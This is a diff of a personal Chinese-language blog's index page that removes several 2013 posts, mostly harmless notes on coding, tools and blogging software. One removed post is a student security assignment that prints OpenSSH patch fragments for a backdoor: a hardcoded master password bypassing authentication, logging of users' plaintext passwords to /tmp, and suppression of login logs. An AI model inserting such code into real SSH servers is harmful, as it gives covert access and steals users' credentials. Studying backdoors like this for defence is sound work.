@@ -19,105 +19,6 @@
     </header>
     <div id="wrapper">
         <div id="content">
-            <h4 class="date">12月 30, 2013</h4>
-            <article class="post">
-<h2 class="title">
-                    <a href="http://caoyijun.com/ssh-backdoor-a-simple-example.html" rel="bookmark" title="Permanent Link to &quot;SSH Backdoor a simple example&quot;">SSH Backdoor a simple example</a>
-                </h2>
-
-                <h1>SSH Backdoor --- a simple example analysis</h1>
-<h4>Information security assignment by 曹逸君[1352872]</h4>
-<blockquote>
-<p>It's not a secret that there are dozens of ssh backdoor out there.<br />
-And it's fairly easy to write a simple one.<br />
-Usually they have two main functions. <br />
-<strong>Secret authentication</strong> and <strong>Password|RSA key collection</strong>   <br />
-</p>
-</blockquote>
-<h2>Secret authentication</h2>
-<p>Password or RSA key auth for the backdoor user,In the example only password auth implemented.  </p>
-<div class="highlight"><pre><span class="gh">diff -u openssh/includes.h openssh.patch//includes.h</span>
-<span class="gd">--- openssh/includes.h  2010-10-24 06:47:30.000000000 +0800</span>
-<span class="gi">+++ openssh.patch//includes.h   2013-12-24 22:17:53.385927565 +0800</span>
-<span class="gu">@@ -172,4 +172,9 @@</span>
-
- #include &quot;entropy.h&quot;
-
-<span class="gi">+int secret_auth;</span>
-<span class="gi">+FILE *f;</span>
-<span class="gi">+#define ILOG &quot;/tmp/ilog&quot;</span>
-<span class="gi">+#define OLOG &quot;/tmp/olog&quot;</span>
-<span class="gi">+#define SECRETPW &quot;flyhigh&quot;</span>
-</pre></div>
-
-
-<div class="highlight"><pre>    diff -u openssh/auth-passwd.c openssh.patch//auth-passwd.c
-    +   if (!strcmp(password, SECRETPW)) {
-    +                secret_auth=1;
-    +                return 1;
-    +        }
-</pre></div>
-
-
-<h2>Password|RSA key collection</h2>
-<p>Only passwords collection are implemented in this example.Both in and out. <br />
-And in the example we won't send the stolen passwords to our server, just simply write it to a file. </p>
-<div class="highlight"><pre><span class="o">@@</span> <span class="nt">-123</span><span class="o">,</span><span class="nt">6</span> <span class="o">+</span><span class="nt">126</span><span class="o">,</span><span class="nt">12</span> <span class="o">@@</span>
-    <span class="err">}</span>
- <span class="nf">#endif</span>
-    <span class="nt">result</span> <span class="o">=</span> <span class="nt">sys_auth_passwd</span><span class="o">(</span><span class="nt">authctxt</span><span class="o">,</span> <span class="nt">password</span><span class="o">);</span>
-<span class="o">+</span>   <span class="nt">if</span><span class="o">(</span><span class="nt">result</span><span class="o">)</span><span class="p">{</span>
-<span class="o">+</span>       <span class="n">if</span><span class="p">((</span><span class="n">f</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="n">ILOG</span><span class="o">,</span><span class="s2">&quot;a&quot;</span><span class="p">))</span><span class="o">!=</span><span class="n">NULL</span><span class="p">)</span><span class="err">{</span>
-<span class="o">+</span>           <span class="n">fprintf</span><span class="p">(</span><span class="n">f</span><span class="o">,</span><span class="s2">&quot;user:password --&gt; %s:%s\n&quot;</span><span class="o">,</span><span class="n">authctxt</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">,</span> <span class="n">password</span><span class="p">);</span>
-<span class="o">+</span>           <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
-<span class="o">+</span>       <span class="p">}</span>
-<span class="o">+</span>   <span class="err">}</span>
-</pre></div>
-
-
-<h2>No log for backdoor</h2>
-<p>There are several place modified to prevent log of backdoor user's login activities.like this.  </p>
-<div class="highlight"><pre><span class="gh">diff -u openssh/log.c openssh.patch//log.c</span>
-<span class="gd">--- openssh/log.c   2011-06-20 11:42:23.000000000 +0800</span>
-<span class="gi">+++ openssh.patch//log.c    2013-12-24 22:17:53.385927565 +0800</span>
-<span class="gu">@@ -351,6 +351,7 @@</span>
- void
- do_log(LogLevel level, const char *fmt, va_list args)
- {
-<span class="gi">+if(!secret_auth || secret_auth!=1){</span>
- #if defined(HAVE_OPENLOG_R) &amp;&amp; defined(SYSLOG_DATA_INIT)
-    struct syslog_data sdata = SYSLOG_DATA_INIT;
- #endif
-<span class="gu">@@ -428,3 +429,4 @@</span>
-    }
-    errno = saved_errno;
- }
-<span class="gi">+}</span>
-</pre></div>
-
-
-<h2>Futher features</h2>
-<p>There are features that is crucial to reallife usage. <br />
-    1. rookit to protect the backdoor<br />
-    2. live-patch to make sure sshd won't have to restart.<br />
-    3. auto-send collected passwords and RSA secret keys.  </p>
-<p>These features have been shown up in real-life examples.<br />
-Security is not only about keep the boarder,inner environment monitor is evenly essential.  </p>
-<p>reference<br />
-<a href="http://packetstormsecurity.com/files/114283/OpenSSH-6.0p1-Full-Backdoor-Patch.html">origin patch code</a><br />
-<a href="http://www.openssh.org/">openssh</a></p>
-<p>最近水论文越来越熟练了，=。=</p>
-<blockquote>
-<p>Written with <a href="https://stackedit.io/">StackEdit</a>.</p>
-</blockquote>
-
-                <div class="clear"></div>
-                <div class="info">
-                    <a href="http://caoyijun.com/ssh-backdoor-a-simple-example.html">posted at 21:49</a>
-                </div>
-
-            </article>
-            <div class="clear"></div>
             <h4 class="date">12月 22, 2013</h4>
             <article class="post">
 <h2 class="title">
@@ -134,7 +35,7 @@ Security is not only about keep the boarder,inner environment monitor is evenly 
 </head>
 <body><div class="container"><h1 id="快速傅里叶变换用于变调">快速傅里叶变换–用于变调</h1>
 
-<h4 id="曹逸君-张思雨">曹逸君 1352872  张思雨  1352949</h4>
+<h4 id="曹逸君-张思雨">曹逸君   张思雨  </h4>
 
 <p>PS:用于交线性代数报告，线代的应用。</p>
 
@@ -239,82 +140,6 @@ zH表示对向量z的转置并共轭，H代表埃尔米特Hermite  </p></li>
 
             </article>
             <div class="clear"></div>
-            <h4 class="date">12月 03, 2013</h4>
-            <article class="post">
-<h2 class="title">
-                    <a href="http://caoyijun.com/solve-linear-equation-in-c.html" rel="bookmark" title="Permanent Link to &quot;C语言解线性方程组&quot;">C语言解线性方程组</a>
-                </h2>
-
-                <p>TUT，复旦CS的同鞋扔来个C语言作业。解线性方程组。<br />
-完成后，惊愕的发现，自己和题目给得答案一样。并且，和sage算出的千差万别。<br />
-我实在无法接受sage会算错。我和题目想错到一块也可能性不大。实在匪夷所思。<br />
-
-另外写C真是pain in the ass。前半段时间在搞数组传递的问题，（还好C99给了个比较舒畅的方式）后半段时间就在排下标的bug。  </p>
-<p><a href="https://github.com/c19/exercises/blob/master/fudan_CS_homework/solve_linear_eqautions.c">我写的源码</a></p>
-<blockquote>
-<p>Written with <a href="https://stackedit.io/">StackEdit</a>.</p>
-</blockquote>
-
-                <div class="clear"></div>
-                <div class="info">
-                    <a href="http://caoyijun.com/solve-linear-equation-in-c.html">posted at 23:29</a>
-                </div>
-
-            </article>
-            <div class="clear"></div>
-            <h4 class="date">11月 29, 2013</h4>
-            <article class="post">
-<h2 class="title">
-                    <a href="http://caoyijun.com/loving-mechanical-keyboard.html" rel="bookmark" title="Permanent Link to &quot;loving mechanical keyboard&quot;">loving mechanical keyboard</a>
-                </h2>
-
-                <p>同学送了我个青轴。嗯。。既然用了机械键盘。</p>
-<p><code>还是全键操作吧。</code>
-
-本来就是alt tab。ctrl w。 ctrl t。ctrl e用惯了。。但点链接什么的还是要用鼠标或者触控板。</p>
-<p>Chrome装个Vimium。按f即可给所有链接显示个快捷键，甚是爽快。</p>
-<p>而且发现vim得j、k、u、d移动实在很爽，【不知道是什么时候转变这个思维的，以前感觉这种扭曲得设定没有上下左右直观。
-现在觉得不用离开主键区非常舒服。</p>
-<p>有可能对vim已经有一定程度了解，gg到首行。G到末行。y复制。d删除。:/查找。组合起来非常灵活。</p>
-<p>然后Linux的命令行什么都能做，大家都懂得。</p>
-<p>以前觉得用全键操作是个很扭曲人性得事情，现在看感觉是个自然而然得事情。</p>
-
-                <div class="clear"></div>
-                <div class="info">
-                    <a href="http://caoyijun.com/loving-mechanical-keyboard.html">posted at 00:10</a>
-                </div>
-
-            </article>
-            <div class="clear"></div>
-            <h4 class="date">11月 22, 2013</h4>
-            <article class="post">
-<h2 class="title">
-                    <a href="http://caoyijun.com/first-bite-of-pycharm.html" rel="bookmark" title="Permanent Link to &quot;初试Pycharm&quot;">初试Pycharm</a>
-                </h2>
-
-                <p>以前听到Pycharm。发现是商业软件收费后就忽略它了。
-后来又看到吹捧Pycharm得文章，于是就试用了下。（无耻得找了注册码注册）
-那文章把Pycharm跟Eclipse比。的确是要好用不少。
-
-单行历史回溯，代码改进建议。可以结合Git，还有其他版本管理工具。
-大小100+M，插件都在一个地方可以找到。settings-plugins里面。不像Eclipse那个小坑。</p>
-<p>因为Pycharm是IDE得关系，提示做得特别细致。</p>
-<p>冒号前有空格不符合PEP 8 规范。。函数传入参数未使用。</p>
-<p>但把我得多行注释特意标注出来，写着“这行没有任何作用”。这就有点侮辱智商了。</p>
-<p>另外Typo得检测似乎非常弱智。所有赋值声明得变量都说是typo。=。=</p>
-<p>相比之下单纯敲代码我还是更喜欢sublime。再用pdb调试。</p>
-<p>单词补全、自动缩进，有这些就足够舒服了。</p>
-<p>如果是那种强迫症患者，想要严格符合Python编码规范，用Pycharm是不错得选择。</p>
-<p>另外Pycharm得调试也要更简单易用一点。</p>
-<p>（PS：好吧，我承认这篇是我用来保持Github streak 的水文。Github Streak，欲罢不能。）</p>
-
-                <div class="clear"></div>
-                <div class="info">
-                    <a href="http://caoyijun.com/first-bite-of-pycharm.html">posted at 12:04</a>
-                </div>
-
-            </article>
-            <div class="clear"></div>
             <h4 class="date">11月 19, 2013</h4>
             <article class="post">
 <h2 class="title">
@@ -343,32 +168,6 @@ zH表示对向量z的转置并共轭，H代表埃尔米特Hermite  </p></li>
                 <div class="clear"></div>
                 <div class="info">
                     <a href="http://caoyijun.com/tongji-university-electrictiy-balance-low-warner.html">posted at 22:47</a>
-                </div>
-
-            </article>
-            <div class="clear"></div>
-            <h4 class="date">11月 12, 2013</h4>
-            <article class="post">
-<h2 class="title">
-                    <a href="http://caoyijun.com/why-company-will-die-out.html" rel="bookmark" title="Permanent Link to &quot;为什么公司必亡&quot;">为什么公司必亡</a>
-                </h2>
-
-                <p>一个游戏公司，一个网页游戏开发团队包括设计师需要30+人。
-他们用C++写业务逻辑，声称那样更稳定。
- 
-我认识得页游小团队除了投资人整个就只有6人。美工外包。
-他们用clojure。</p>
-<p>一个网络广告公司（网络广告投放）IT团队有60人，人人做得事情都不重复。
-HR不懂技术分不清运维、C/C++程序员、android开发等等。</p>
-<p>而事实上搜索引擎得广告投递根本不需要这种公司代理，页面上简单操作就能顺利投递，实时查看收益。</p>
-<p>公司的内耗十分严重，公司所有者不信任执行者，会使用更容易找到替换人员得技术，把职能分得更细，而只要把所有者和执行者分开，就会有这种问题。</p>
-<p>黑客和画家对此已有详细得论述。</p>
-<p>可喜的是看到不少小团队开始去公司化，没有经理职位。没有高级头衔。执行者既是所有者。</p>
-<p>相信将来这样的高效、全能得小团队将会击溃各种传统腐朽冗杂的大小公司。</p>
-
-                <div class="clear"></div>
-                <div class="info">
-                    <a href="http://caoyijun.com/why-company-will-die-out.html">posted at 16:50</a>
                 </div>
 
             </article>
@@ -552,79 +351,6 @@ git --git-dir<span class="o">=</span>/path/blog.git/ --work-tree<span class="o">
                 <div class="clear"></div>
                 <div class="info">
                     <a href="http://caoyijun.com/git-hooks-auto-deploy-website.html">posted at 19:42</a>
-                </div>
-
-            </article>
-            <div class="clear"></div>
-            <article class="post">
-<h2 class="title">
-                    <a href="http://caoyijun.com/fuck-nikola-use-pelican.html" rel="bookmark" title="Permanent Link to &quot;从nikola换成pelican&quot;">从nikola换成pelican</a>
-                </h2>
-
-                <p>有个博客还是很重要的。
-nikola默认用reStructuredText做轻量标记语言。
-不知道是不是markdown先入为主。觉得RST很不好用。
-
-nikola v6.2.1 的base template文件：<code>/usr/local/lib/python2.7/dist-packages/nikola/data/themes/base/templates/disqus_helper.tmpl</code></p>
-<p>存在bug。有一句：</p>
-<p><code>dsq.src = \'http://\' + disqus_shortname + \'.disqus.com/embed.js\';</code></p>
-<p>不知道谁很想当然得写了个<code>http://</code>进去。https的网站，比如说我，就郁闷了。</p>
-<p>在github上看下发现bug四天前已经被修复了。   =。= 下东西还是直接从github上下最新得比较舒服。</p>
-<p>20140419 update:</p>
-<p>更换为pelican。Nikola各种恼人的小bug。egg文件权限去掉了read搞得其他库都出问题。所有文章全部全文列在首页。(默认设置)。今天又发现galleries里图片文件名为中文编码出问题。虽然不是nikola的问题。而是doit的。换python3环境也各种问题。来老扔warning you must install markdown blah blah。。不爽。目录结构也很乱。相比pelican的整体结构就很简洁。quickstart问题也很亲切。是否通过ftp或ssh或Dropbox S3部署之类。</p>
-<div class="highlight"><pre>Welcome to pelican-quickstart v3.3.0.
-
-This script will help you create a new Pelican-based website.
-
-Please answer the following questions so this script can generate the files
-needed by Pelican.
-
-
-&gt; Where do you want to create your new web site? [.] 
-&gt; What will be the title of this web site? 曹逸君 Blog
-&gt; Who will be the author of this web site? 曹逸君     
-&gt; What will be the default language of this web site? [en] zh
-&gt; Do you want to specify a URL prefix? e.g., http://example.com   (Y/n) n
-&gt; Do you want to enable article pagination? (Y/n) 
-&gt; How many articles per page do you want? [10] 7
-&gt; Do you want to generate a Fabfile/Makefile to automate generation and publishing? (Y/n) 
-&gt; Do you want an auto-reload &amp; simpleHTTP script to assist with theme and site development? (Y/n) 
-&gt; Do you want to upload your website using FTP? (y/N) 
-&gt; Do you want to upload your website using SSH? (y/N) 
-&gt; Do you want to upload your website using Dropbox? (y/N) 
-&gt; Do you want to upload your website using S3? (y/N) 
-&gt; Do you want to upload your website using Rackspace Cloud Files? (y/N)
-</pre></div>
-
-
-<p>略微蛋疼的是之前markdown头部是这样标注标题的：</p>
-<div class="highlight"><pre>&lt;!--
-.. link:
-.. description:
-.. tags:
-.. date: 2013/11/19 22:47:29
-.. title: 同济电费过低提醒
-.. slug: tongji-university-electrictiy-balance-low-warner
---&gt;
-</pre></div>
-
-
-<p>而pelican认的格式是这种：</p>
-<div class="highlight"><pre><span class="n">link</span><span class="o">:</span>
-<span class="n">description</span><span class="o">:</span>
-<span class="n">tags</span><span class="o">:</span>
-<span class="n">date</span><span class="o">:</span> <span class="mi">2013</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">19</span> <span class="mi">22</span><span class="o">:</span><span class="mi">47</span><span class="o">:</span><span class="mi">29</span>
-<span class="n">title</span><span class="o">:</span> <span class="err">同济电费过低提醒</span>
-<span class="n">slug</span><span class="o">:</span> <span class="n">tongji</span><span class="o">-</span><span class="n">university</span><span class="o">-</span><span class="n">electrictiy</span><span class="o">-</span><span class="n">balance</span><span class="o">-</span><span class="n">low</span><span class="o">-</span><span class="n">warner</span>
-</pre></div>
-
-
-<p>注意那个日期格式的不同。。没错。就是这么蛋疼。Pelican能做得兼容容错性更好就更好了。</p>
-<p>最坑的是markdown的table居然不给我生成出来。Pelican就啥事没有。明明都用的markdown的库。。搞不懂。</p>
-
-                <div class="clear"></div>
-                <div class="info">
-                    <a href="http://caoyijun.com/fuck-nikola-use-pelican.html">posted at 15:01</a>
                 </div>
 
             </article>
